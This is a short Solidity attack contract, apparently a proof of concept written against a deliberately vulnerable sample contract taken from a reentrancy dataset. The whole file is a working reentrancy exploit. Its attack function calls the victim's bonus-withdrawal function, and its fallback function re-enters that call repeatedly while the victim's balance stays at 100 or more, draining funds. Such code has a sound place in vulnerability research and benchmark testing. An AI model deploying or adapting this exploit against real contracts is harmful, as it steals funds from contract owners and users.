pragma solidity ^0.4.24;

import "../dataset/reentrancy/reentrancy_bonus.sol";

contract MaliciousContract {
    Reentrancy_bonus reentrancy_bonus;

    constructor(address _victimAddress) public {
        reentrancy_bonus = Reentrancy_bonus(_victimAddress);
    }

    function attack() external payable {
        reentrancy_bonus.getFirstWithdrawalBonus(address(this));
    }

    function() external payable {
        // Re-enter the vulnerable function if there's still balance to collect
        if (address(reentrancy_bonus).balance >= 100) {
            reentrancy_bonus.getFirstWithdrawalBonus(address(this));
        }
    }
}
